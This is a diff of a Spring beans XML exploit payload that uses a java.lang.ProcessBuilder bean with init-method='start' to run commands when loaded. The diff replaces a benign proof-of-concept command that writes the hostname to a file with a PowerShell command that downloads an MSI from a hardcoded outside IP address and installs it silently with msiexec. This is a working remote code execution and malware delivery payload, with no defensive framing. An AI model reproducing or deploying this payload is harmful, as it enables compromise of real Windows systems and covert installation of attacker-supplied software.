@@ -1,13 +1,11 @@
-cat << 'EOF' > poc.xml
 <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
     <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
         <constructor-arg>
             <list>
                 <value>cmd.exe</value>
                 <value>/c</value>
-                <value>hostname > C:\Windows\Temp\hostname_output.txt</value>
+                <value>powershell -Command "$p='C:\Users\Public\setup.msi'; try { Invoke-WebRequest -Uri 'http://151.247.22.37/sc/new.msi' -OutFile $p -ErrorAction Stop; if (Test-Path $p) { Start-Process msiexec.exe -ArgumentList '/i', $p, '/qn', '/norestart' -Wait; echo 'Success' } } catch { Write-Host 'Error: ' $_.Exception.Message }"</value>
             </list>
         </constructor-arg>
     </bean>
 </beans>
-EOF
